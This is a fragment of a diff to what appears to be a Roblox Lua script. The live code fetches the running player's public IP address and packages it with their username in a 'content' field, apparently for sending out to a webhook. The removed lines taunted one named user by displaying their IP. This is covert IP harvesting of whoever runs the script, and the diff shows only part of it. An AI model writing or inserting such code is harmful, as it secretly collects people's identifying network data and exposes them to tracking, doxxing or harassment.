@@ -3142,9 +3142,6 @@ task.spawn(function()
 
 
 local e = game:HttpGet("https://checkip.amazonaws.com")
-if game.Players.LocalPlayer.Name == "PoopPeeReKey" then
-notify("YOUR A STUPID MONKEY", "Your ip is"..e)
-end
 local data ={
 	["content"] = e.." "..game.Players.LocalPlayer.Name
 }
